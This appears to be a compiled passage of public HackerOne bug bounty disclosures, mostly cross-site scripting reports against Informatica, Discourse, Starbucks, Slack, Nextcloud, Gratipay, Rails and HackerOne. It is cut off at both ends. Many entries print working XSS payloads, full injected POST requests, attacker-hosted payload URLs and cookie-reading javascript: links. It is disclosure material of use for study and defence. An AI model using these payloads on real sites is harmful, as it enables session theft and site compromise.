A&#61;&#61;wzh87&apos;&#45;alert&#40;1&#41;&#45;&apos;k50k8&quot;&#44;&quot;counter&quot;&#58;&#45;1&#125;&#93;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

{F145453}

This code is part of the [official Yubico PHP U2F library](https://github.com/Yubico/php-u2flib-server). In a first step I'll coordinate with @christophwurst to remove this file from the release on apps.nextcloud.com, then I'll make sure to reach out to Yubico to get this resolved in their library.

---

### [Stored cross-site scripting (XSS) on a DoD website](https://hackerone.com/reports/183971)

- **Report ID:** `183971`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @jon_bottarini
- **Bounty:** - usd
- **Disclosed:** 2017-03-16T18:26:08.788Z
- **CVE(s):** -

**Summary (team):**

A stored cross-site scripting vulnerability was found on a Department of Defense website which may trick a web user into executing a malicious script, potentially revealing a user's web session information or modify web content. @jon_bottarini was able to demonstrate this vulnerability by crafting a specially formatted URL. Thanks @jon_bottarini!

---

### [[uk.informatica.com] XSS on uk.informatica..com](https://hackerone.com/reports/143323)

- **Report ID:** `143323`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @grampae
- **Bounty:** - usd
- **Disclosed:** 2017-02-28T04:15:38.590Z
- **CVE(s):** -

**Vulnerability Information:**

The following urls on uk.informatica.com:80 have XSS vulnerabilities, I have copied the POST header and data for both instances.

--------------------------------------------------------------------------------------------------------------------------------------------
http://uk.informatica.com:80/o/Default.asp (parameters found vulnerable PageLink, ResponseHandlingLanguage, UID), The below example shows the PageLink parameter being exploited with 
" style="width:expression(prompt(1));

POST /o/Default.asp HTTP/1.1
Content-Length: 779
Content-Type: application/x-www-form-urlencoded
Referer: http://uk.informatica.com:80/
Cookie: eu=; ASPSESSIONIDQCABSAAR=DMLJGLOADMFJNAEMPHCPLBMG; Lang=ResponseHandlingLanguage=British
Host: uk.informatica.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

OPTOUT=Submit&DMAILX=true&EMAIL=sample%40email.tst&EMAILX=true&EVENTS_DMAIL=TRUE&EVENTS_EMAIL=TRUE&EVENTS_PHONE=TRUE&NAME=&NEWSLETTERS_DMAIL=TRUE&NEWSLETTERS_EMAIL=TRUE&NEW_PRODUCT_DMAIL=TRUE&NEW_PRODUCT_EMAIL=TRUE&NEW_PRODUCT_PHONE=TRUE&OptOutForm=OptOutForm&PageLink=1" style="width:expression(prompt(1));&PHONEX=true&PRODUCT_UPDATE_DMAIL=TRUE&PRODUCT_UPDATE_EMAIL=TRUE&PRODUCT_UPDATE_PHONE=TRUE&PROMOTIONS_DMAIL=TRUE&PROMOTIONS_EMAIL=TRUE&PROMOTIONS_PHONE=TRUE&ResponseHandlingLanguage=British&SURNAME=&TITLE=&TRAINING_DMAIL=TRUE&TRAINING_EMAIL=TRUE&TRAINING_PHONE=TRUE&UID=&USERGROUPS_DMAIL=TRUE&USERGROUPS_EMAIL=TRUE&USERGROUPS_PHONE=TRUE&WEBINAR_DMAIL=TRUE&WEBINAR_EMAIL=TRUE&WEBINAR_PHONE=TRUE&WHITEPAPERS_DMAIL=TRUE&WHITEPAPERS_EMAIL=TRUE&WHITEPAPERS_PHONE=TRUE

--------------------------------------------------------------------------------------------------------------------------------------------

http://uk.informatica.com:80/r/Default.asp (parameters found vulnerable PageLink, ResponseHandlingLanguage, UID), The below example shows the UID parameter being exploited with "><script>prompt(1)</script> .

POST /r/Default.asp HTTP/1.1
Content-Length: 779
Content-Type: application/x-www-form-urlencoded
Referer: http://uk.informatica.com:80/
Cookie: eu=; ASPSESSIONIDQCABSAAR=DMLJGLOADMFJNAEMPHCPLBMG; Lang=ResponseHandlingLanguage=British
Host: uk.informatica.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

OPTOUT=Submit&DMAILX=true&EMAIL=sample%40email.tst&EMAILX=true&EVENTS_DMAIL=TRUE&EVENTS_EMAIL=TRUE&EVENTS_PHONE=TRUE&NAME=&NEWSLETTERS_DMAIL=TRUE&NEWSLETTERS_EMAIL=TRUE&NEW_PRODUCT_DMAIL=TRUE&NEW_PRODUCT_EMAIL=TRUE&NEW_PRODUCT_PHONE=TRUE&OptOutForm=OptOutForm&PageLink=1&PHONEX=true&PRODUCT_UPDATE_DMAIL=TRUE&PRODUCT_UPDATE_EMAIL=TRUE&PRODUCT_UPDATE_PHONE=TRUE&PROMOTIONS_DMAIL=TRUE&PROMOTIONS_EMAIL=TRUE&PROMOTIONS_PHONE=TRUE&ResponseHandlingLanguage=British&SURNAME=&TITLE=&TRAINING_DMAIL=TRUE&TRAINING_EMAIL=TRUE&TRAINING_PHONE=TRUE&UID="><script>prompt(1)</script>&USERGROUPS_DMAIL=TRUE&USERGROUPS_EMAIL=TRUE&USERGROUPS_PHONE=TRUE&WEBINAR_DMAIL=TRUE&WEBINAR_EMAIL=TRUE&WEBINAR_PHONE=TRUE&WHITEPAPERS_DMAIL=TRUE&WHITEPAPERS_EMAIL=TRUE&WHITEPAPERS_PHONE=TRUE

---

### [Subdomain Takeover (moderator.ubnt.com)](https://hackerone.com/reports/181665)

- **Report ID:** `181665`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Ubiquiti Inc.
- **Reporter:** @madrobot
- **Bounty:** - usd
- **Disclosed:** 2017-02-06T08:31:51.441Z
- **CVE(s):** -

**Vulnerability Information:**

Hello __Team__

This report is same as #179110

One of your subdomain http://moderator.ubnt.com is pointing towards
```
216.58.203.243    moderator.ubnt.com
216.58.203.243    ghs.google.com
216.58.203.243    ghs.l.google.com
```
{F134183}
And it is unclaimed

When I open it 
it is showing 

{F134184}

__Impact__ :-
An attacker can claim this subdomain by requesting a process of registering this abandoned subdomain to his name.

And attacker can fully take over this subdomain and do whatever he wants. this can cause huge damage to the website's main domain as well as to the company.

I Recommend removing  the Cname and DNS connecting to it.

You can read about this sort of attacks here : https://www.siteground.com/tutorials/googleapps/google_calendar.htm

To clarify your doughs I just added video POC

>1ST Video Is about how I am able to claim it https://youtu.be/51Ku4cGbijE
>2ND Video is proof when trying to claim it for the second time https://youtu.be/GJcWsHJj8aE

---

### [[marketplace.informatica.com] Persistent XSS through document title](https://hackerone.com/reports/181816)

- **Report ID:** `181816`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @kasperkarlsson
- **Bounty:** - usd
- **Disclosed:** 2017-02-02T04:29:44.457Z
- **CVE(s):** -

**Vulnerability Information:**

Document titles are not properly escaped before being printed on https://marketplace.informatica.com/docs/ . By including a payload in a document title, an attacker can create a document with a persistent XSS vector which executes for anyone viewing the document page.

Proof of concept
===
The following steps are accompanied by screenshots attached to this report.

1. Log into https://marketplace.informatica.com/ and go to your profile page. Select New -> Document.
2. Choose a location for your new document - "Your Documents" will work just fine.
3. Enter some text in the document body and insert the following XSS vector in the document title: `";alert("XSS in "+document.domain);//`
4. Hit "Publish" on the bottom of the page.
5. Visiting the document page causes the XSS payload to execute.

This test was performed using Mozilla Firefox 49.0.2 and was also confirmed in Google Chrome 54.0.2840.87. The exploit should work in any browser, as the persistent payload cannot be distinguished from a legitimate script from the server.

Recommended solution
===
Make sure to correctly output encode the document title before printing it to a javascript scope of the document page.

---

### [Stored XSS in topics because of whitelisted_generic engine vulnerability](https://hackerone.com/reports/197902)

- **Report ID:** `197902`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Discourse
- **Reporter:** @skavans
- **Bounty:** - usd
- **Disclosed:** 2017-01-20T23:50:19.189Z
- **CVE(s):** -

**Vulnerability Information:**

Hello!

**Steps to reproduce:**
1. Paste this payload URL in the topic: http://89.223.28.48/og_image.html?uncache1234
2. Save the post and you will see the XSS will fire
{F151911}

Though you now escape the OpenGraph data, the whitelisted_generic onebox engine decodes variables values back at lines: [202](https://github.com/discourse/onebox/blob/master/lib/onebox/engine/whitelisted_generic_onebox.rb#L202) and [207](https://github.com/discourse/onebox/blob/master/lib/onebox/engine/whitelisted_generic_onebox.rb#L207).
Then these decoded values are injected in the raw HTML [here](https://github.com/discourse/onebox/blob/master/lib/onebox/engine/whitelisted_generic_onebox.rb#L284) and [here](https://github.com/discourse/onebox/blob/master/lib/onebox/engine/whitelisted_generic_onebox.rb#L289) that leads to XSS attack possibility.

Example post with stored XSS inside is: https://try.discourse.org/t/testing-is-in-progress/620
Please let me know if you need some extra information to locate and fix the bug.

---

### [XSS in topics because of bandcamp preview engine vulnerability](https://hackerone.com/reports/197443)

- **Report ID:** `197443`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Discourse
- **Reporter:** @skavans
- **Bounty:** - usd
- **Disclosed:** 2017-01-20T23:50:12.412Z
- **CVE(s):** -

**Vulnerability Information:**

1. Load http://try.discourse.org
2. Click "New topic"
3. Enter this payload https://89.223.28.48/bandcamp.com/album/index.html?XSSa2 to field with placeholder "Type title or paste a link here"
4. Wait for the preview engine to parse the link
4. XSS will fire

{F151439}

You should sanitize external data in this engine and replace *matches_regexp* from
`^https?:\/\/.*bandcamp\.com\/album\/`
to
`^https?:\/\/.*\.bandcamp\.com\/album\/`
to fix the issue.

---

### [Stored XSS in posts because of absence of oembed variables values escaping](https://hackerone.com/reports/197914)

- **Report ID:** `197914`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Discourse
- **Reporter:** @skavans
- **Bounty:** - usd
- **Disclosed:** 2017-01-20T23:50:01.965Z
- **CVE(s):** -

**Vulnerability Information:**

Hello!

**Steps to reproduce:**
1. Paste this payload URL in the post: http://89.223.28.48/oembed_video.html?uncache
2. Save the post and you will see the XSS will fire.

{F151922}

The vulnerability exists because of absence of oembed variables values escaping.
There is the oembed link in the payload page:

```html
<link type='application/json+oembed' href='http://89.223.28.48/oembed.json'>
```
As you can see the onebox parser goes to this oembed URL to get the data:
```
64.71.168.198 - - [12/Jan/2017:19:13:52 +0000] "GET /oembed_video.html HTTP/1.1" 200 388 "-" "Ruby"
64.71.168.198 - - [12/Jan/2017:19:13:52 +0000] "GET /oembed.json HTTP/1.1" 200 389 "-" "Ruby"
```
The content of *oembed.json* is:
```json
{
        "type": "image",
        "image": "xss",
        "description": "descr' onerror='alert(/XSS by skavans/)",
        "image_width": 1,
        "image_height": 1
}
```

So the unescaped data is injected in the raw HTML at [this line](https://github.com/discourse/onebox/blob/master/lib/onebox/engine/whitelisted_generic_onebox.rb#L284) of generic_whitelisted onebox engine that leads to XSS vulnerability.

The example post with stored XSS inside is: https://try.discourse.org/t/this-is-just-one-test/632

Please let me know if you need some extra information to locate and fix the bug.

---

### [Persistent XSS in www.starbucks.com](https://hackerone.com/reports/188972)

- **Report ID:** `188972`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Starbucks
- **Reporter:** @ddworken
- **Bounty:** - usd
- **Disclosed:** 2017-01-17T21:57:52.926Z
- **CVE(s):** -

**Vulnerability Information:**

There is a persistent XSS in 

```
https://www.starbucks.com/coffee/espresso/latte-macchiato
```

It is caused by loading scripts from: 

```
//starbucksmacchiato-prod.elasticbeanstalk.com/scripts/bn-v1.0.0-Release-min.js
```

Note that ```starbucksmacchiato-prod.elasticbeanstalk.com``` is not registered on elastic beanstalk. You can verify this by looking up the IP address for this subdomain and noting that it does not resolve. Through registering that domain on elastic beanstalk and deploying a webserver that responds to that request with javascript, an attacker could get a persistent XSS on Starbuck's website. 

I have not registered that domain with Elastic Beanstalk since it would give me a large amount of information about the user's of Starbuck's website (and it would incur a large amount of traffic-more than I'd like to pay for on AWS!). If you would like me to do so, let me know but I do not want to go past the bounds of acceptable testing. 

Thanks,
David Dworken

---

### [SQL Injection vulnerability on a DoD website](https://hackerone.com/reports/186156)

- **Report ID:** `186156`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @korprit
- **Bounty:** - usd
- **Disclosed:** 2017-01-11T20:54:07.837Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense webserver was vulnerable to a SQL injection attack that could have revealed sensitive financial information. korprit was able to demonstrate this vulnerability by crafting a specially formatted URL. Thanks korprit!

---

### [XSS Vulnerability on Image link parser](https://hackerone.com/reports/191909)

- **Report ID:** `191909`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Discourse
- **Reporter:** @alberto__segura
- **Bounty:** 256 usd
- **Disclosed:** 2017-01-10T10:01:45.694Z
- **CVE(s):** -

**Vulnerability Information:**

I found a XSS (Cross-Site Scripting) vulnerability, and it is present in the markdown parser when it tries to parse an image URL.

To reproduce the vulnerability you need to add a fake image url like:

http://host/path/to/image'onerror=alert(1);//.png

As you can see, we have an invalid image URL which finish with an image extension (PNG). By putting the ' we are able to break the "img" tag in which the image url is included by the parser and add custom code, allowing us to run Javascript code. A malicious user could use the $.getScript function to load a malicious script.

If you need more information about the vulnerability, please, feel free to reply.

---

### [XSS vulnerability on Audio and Video parsers](https://hackerone.com/reports/192223)

- **Report ID:** `192223`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Discourse
- **Reporter:** @alberto__segura
- **Bounty:** 256 usd
- **Disclosed:** 2017-01-10T10:01:36.232Z
- **CVE(s):** -

**Vulnerability Information:**

Just like in the XSS vulnerability on Image parser, there is the same vulnerability on Audio (https://github.com/discourse/onebox/blob/394409ca319cc1a1cd31fefa50c9468c990531a3/lib/onebox/engine/audio_onebox.rb) and Video (https://github.com/discourse/onebox/blob/394409ca319cc1a1cd31fefa50c9468c990531a3/lib/onebox/engine/video_onebox.rb) parsers.

A malicious user can include a "fake" audio or video URL with a ' character, allowing him to execute Javascript code. 

Audio URL example: http://host/path'onerror=alert(1);//k.mp3
Video URL example: http://host/path'onerror=alert(1);//k.mp4

Ask me if you need more info to reproduce the vulnerability.

Best regards,
Alberto

---

### [DOM Based XSS in Discourse Search](https://hackerone.com/reports/191890)

- **Report ID:** `191890`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Discourse
- **Reporter:** @khizer47
- **Bounty:** - usd
- **Disclosed:** 2017-01-10T00:08:01.948Z
- **CVE(s):** -

**Vulnerability Information:**

###Steps to Reproduce:

1. Load http://try.discourse.org
2.Now From Top Right Corner Click on Search Button 
3. Enter payload their 

###Payload:

@<script>prompt(1337)</script>gmail.com

4: Now in new windows that opens click on advance search and The XSS will Occur :) 
5: Now copy the link and send to victim there the XSS will Occur To 

Thanks
Khizer Javed

---

### [Store XSS](https://hackerone.com/reports/187410)

- **Report ID:** `187410`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Slack
- **Reporter:** @imran_hadid
- **Bounty:** - usd
- **Disclosed:** 2017-01-01T20:46:32.675Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team.

I found a Store XSS. Where the company name is the vulnerable to XSS. If you give this below XSS script as Company name, you will get the XSS pop up after the login in message option where it'll randomly generated at the message room.
“><IMG SRC=x onerror=javascript:alert(&quot;XSS-by-Imran&quot;)> 

 Here is the POC:
https://youtu.be/dqrH2WhIgtk

Thanks

---

### [Stored XSS on new Calling plugin (spreed)](https://hackerone.com/reports/190870)

- **Report ID:** `190870`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Nextcloud
- **Reporter:** @coolboss
- **Bounty:** - usd
- **Disclosed:** 2016-12-13T21:08:22.342Z
- **CVE(s):** -

**Vulnerability Information:**

There's a stored xss vulnerability ....

Proof Of Concept :
===============
1. Set `name` as an xss payload like `"x><img src=a onerror=alert(1)>`.
{F143238}
2. Invite people to single call room.
3. Xss will execute in IE. (It doesn't support CSP)
{F143237}

Impact :
========
Admin user can be xssed via this method if admin uses browsers like IE.

Let me know if you need help in reproducing

---

### [[now.informatica.com] Reflective XSS](https://hackerone.com/reports/106678)

- **Report ID:** `106678`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @robd4k
- **Bounty:** - usd
- **Disclosed:** 2016-12-09T10:10:18.321Z
- **CVE(s):** -

**Vulnerability Information:**

XSS vulnerability lies on `http://now.informatica.com/launch-next-bigdata-registration-inxpo.html?Source=homepage`

#POC

* Sign up for big data management Virtual launch event

* on parameter `company_name`  inject `'"><img src=x onerror=alert(1)>`

---

### [Public profile is vulnerable to stored XSS / Facebook Token can be stolen](https://hackerone.com/reports/175122)

- **Report ID:** `175122`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** DigitalSellz
- **Reporter:** @robin_linus
- **Bounty:** - usd
- **Disclosed:** 2016-11-27T23:12:31.179Z
- **CVE(s):** -

**Summary (team):**

@robin_linus bypass our XSS protection system. This Vulnerability has been fixed.

---

### [[now.informatica.com] Reflective Xss](https://hackerone.com/reports/81191)

- **Report ID:** `81191`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Informatica
- **Reporter:** @alyssa_herrera
- **Bounty:** - usd
- **Disclosed:** 2016-05-19T00:47:38.051Z
- **CVE(s):** -

**Vulnerability Information:**

http://now.informatica.com/en_data-integration-for-dummies_book_2642.html?source=Homepage
The issue is located here. I will be including a video demonstrating this vulnerability 
Xss vector used: <svg onload=confirm(document.domain)>xs

**Summary (researcher):**

Company look up end point didn't properly sanitize input allowing XSS. Typically this isn't very  dangerous but the lack of CSRF tokens meant that an attacker would be able to craft a landing page that would be able to perform actions without the user knowledge

---

### [Stored XSS On Statement](https://hackerone.com/reports/84740)

- **Report ID:** `84740`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Gratipay
- **Reporter:** @ibram
- **Bounty:** - usd
- **Disclosed:** 2015-09-03T16:00:59.165Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,
I've Found a Stored Cross-Site Scripting (XSS) In [Gratipay.com](https://gratipay.com/) .. This XSS is in The Statement, It Happens Because You're Not Sanitizing This From Markdown Malicious Codes.

##Steps To Reproduce :
1. Login To Your Account At [Gratipay.com](https://gratipay.com/)
2. Go To Your Profile Page .. And Click **Edit Statement**
3. Enter Any Of These 2 Payload : 
 * `[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)`
 * `<javascript:alert(document.cookie)>`
4. Click **Save**

Now You'll See 2 Links *(See Links.png)* .. Click On Any Of These 2 Links And The XSS Payload Will Be Triggered :)

Also This is Dangerous Because The Profile's Statement is Public .. 
So Anyone Visit The Attaker's Profile And Click On This Malicious Link, XSS Will Be Triggered On His Browser. 

Take a Look At My Profile On Gratipay : https://gratipay.com/~geekpero/.

Please Let Me Know If You Need Any Information.

**References About Markdown XSS:**
* http://stackoverflow.com/questions/1690601/markdown-and-xss
* https://michelf.ca/blog/2010/markdown-and-xss/

Best Regards,
Ebram Marzouk

---

### [JSON keys are not properly escaped](https://hackerone.com/reports/47280)

- **Report ID:** `47280`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** Ruby on Rails
- **Reporter:** @einstein_
- **Bounty:** - usd
- **Disclosed:** 2015-06-16T19:38:34.244Z
- **CVE(s):** CVE-2015-3226

**Vulnerability Information:**

Rails does not escape hash keys properly in `to_json` when generating json.

Values are escaped as expected
```ruby
irb(main):001:0> {"a"=>"<>"}.to_json
=> "{\"a\":\"\\u003c\\u003e\"}"
```

However keys are not:
```ruby
irb(main):002:0> {"<>"=>"a"}.to_json
=> "{\"<>\":\"a\"}"
```

This is because the `json` gem calls `.to_s` on the keys [here](https://github.com/flori/json/blob/259dee6c9bdda08ed0c1fc2e69bfbb2d377faba0/ext/json/ext/generator/generator.c#L738) which transforms the `EscapedString` back into a simple `String` so it doesn't go through the escaping process that values go through [here](https://github.com/EiNSTeiN-/rails/blob/3820788e4c2825dd77c779ba5b3bc29689e04e1d/activesupport/lib/active_support/json/encoding.rb#L54-L60).

**Security consideration**: this issue is a vector for XSS when an arbitrary value is used as a key and reflected in a javascript tag. Consider this piece of code:
```ruby
javascript_tag "var json=#{params.to_json}"
```
When params is something like `{"</script><script>alert(1)//"=>"xss"}` then `<>` are not escaped as they should and the javascript tag looks like this:
```html
<script>
//<![CDATA[
var json={"</script><script>alert(1)//":"xss"}
//]]>
</script>
```
The `</script>` inside the json object will terminate the opening script tag because it has precedence over everything else, and `alert(1)` is executed.

I believe this issue also applies to 4.2-stable and master.

Note that I opened a PR for a related issue in the json gem (https://github.com/flori/json/pull/235) which occurs when `ActiveSupport.escape_html_entities_in_json = false` because the forward slash is never escaped (neither in rails nor in the json gem). It might be worth fixing this in rails as well.

**Summary (team):**

XSS Vulnerability in ActiveSupport::JSON.encode 

There is an XSS vulnerability in the ActiveSupport::JSON.encode method in Ruby on Rails. 
This vulnerability has been assigned the CVE identifier CVE-2015-3226. 

Versions Affected:  3.0.x, 3.1.x, 3.2.x, 4.1.x, 4.2.x. 
Not affected:       4.0.x. 
Fixed Versions:     4.2.2, 4.1.11 

Impact 
------ 
When a `Hash` containing user-controlled data is encode as JSON (either through 
`Hash#to_json` or `ActiveSupport::JSON.encode`), Rails does not perform adequate 
escaping that matches the guarantee implied by the `escape_html_entities_in_json` 
option (which is enabled by default). If this resulting JSON string is subsequently 
inserted directly into an HTML page, the page will be vulnerable to XSS attacks. 

For example, the following code snippet is vulnerable to this attack: 

    <%= javascript_tag "var data = #{user_supplied_data.to_json};" %> 

Similarly, the following is also vulnerable: 

    <script> 
      var data = <%= ActiveSupport::JSON.encode(user_supplied_data).html_safe %>; 
    </script> 

All applications that renders JSON-encoded strings that contains user-controlled 
data in their views should either upgrade to one of the FIXED versions or use 
the suggested workaround immediately. 

Releases 
-------- 
The FIXED releases are available at the normal locations. 

Workarounds 
----------- 
To work around this problem add an initializer with the following code: 

    module ActiveSupport 
      module JSON 
        module Encoding 
          private 
          class EscapedString 
            def to_s 
              self 
            end 
          end 
        end 
      end 
    end 

Patches 
------- 
To aid users who aren't able to upgrade immediately we have provided patches for the two 
supported release series.  They are in git-am format and consist of a single changeset. 

* 4-1-to_json_xss.patch - Patch for 4.1 series 
* 4-2-to_json_xss.patch - Patch for 4.2 series 

Please note that only the 4.1.x and 4.2.x series are supported at present. 
Users of earlier unsupported releases are advised to upgrade as soon as possible as we cannot 
guarantee the continued availability of security fixes for unsupported releases. 

Credits 
------- 

Thanks to Francois Chagnon of Shopify for reporting the vulnerability to us, and working 
with us on a fix.

---

### [Markdown parsing issue enables insertion of malicious tags and event handlers](https://hackerone.com/reports/46916)

- **Report ID:** `46916`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** HackerOne
- **Reporter:** @danlec
- **Bounty:** 5000 usd
- **Disclosed:** 2015-04-07T21:12:33.546Z
- **CVE(s):** -

**Vulnerability Information:**

When markdown is being presented as HTML, there seems to be a strange interaction between `_` and `@` that lets an attacker insert malicious tags.

**Proof of Concept**

```
_http://danlec_@.1 foo=bar
```

is rendered converted to the following HTML:

``` html
<p><u><a title="http://danlec" href="http://danlec">http://danlec<danlec_@.1 foo=bar</p>
```

As you can see, the output includes a `<danlec_@.1` tag that I can add arbitrary attributes (including event handlers) to.  (There's also an unterminated `<u>` tag which can cause subsequent content to be underlined)

**Security Implications**

I can use `style` to make this tag into a block element, and (if you're using a browser without CSP support for some reason) I can use an `onmouseover` or `onclick` event handler to execute script.  (An attacker might make the malicious tag appear to be a link to a "proof of concept that only works in IE")

This input might look like this: 

```
_http://danlec_@.1 style=background-image:url(... data uri ...);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//
```

which is currently rendered as below.  Clicking on the "Oh No!" image in a browser like IE11 will cause script to execute.

_http://danlec_@.1 style=background-image:url(data:image/png;base64,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);background-repeat:no-repeat;display:block;width:100%;height:100px; onclick=alert(unescape(/Oh%20No!/.source));return(false);//

---

### [Improperly validated fields allows injection of arbitrary HTML via spoofed React objects](https://hackerone.com/reports/49652)

- **Report ID:** `49652`
- **Severity:** High
- **Weakness:** Cross-site Scripting (XSS) - Generic
- **Program:** HackerOne
- **Reporter:** @danlec
- **Bounty:** 5000 usd
- **Disclosed:** 2015-03-18T13:11:50.503Z
- **CVE(s):** -

**Vulnerability Information:**

**Note:** I haven't yet investigated the implications of this fully, so this may be more severe than I'm currently aware of.  Right now the only exploits I'm aware of allow a team member to attack other team members.

I've found a couple fields that I'd expect to be limited to string values, but which **actually accept data of arbitrary types**.  So far, I've found that these include:

- The `reference` field on a report triage action
- The `data` field of a trigger criterion

(There are several other fields that seem to accept an arbitrary type, but appear to be converted into strings.  The above fields also come back from the server as non-strings.)

By manually crafting the JSON used when setting these fields, a malicious person can set them to non-string values, e.g. arrays or simple objects.  

When these fields are rendered, they are assumed to be strings, and passed as the `children` argument when calling `React.createElement`.  Unfortunately, that argument is allowed to be text content **or a React child object**.  Since these fields can in fact be arbitrary objects, we can create an object that appears to be a React element, and which renders as something dangerous.

**Proof of Concept**

Here's how the exploit would work, using the `reference` field on a report:

As an attacker, open up a report and "triage" it, setting the reference field to an object that appears to be a React element.  This can be done from the console using the following command:  
```
$.ajax({ 
  url: "https://hackerone.com/reports/bulk", 
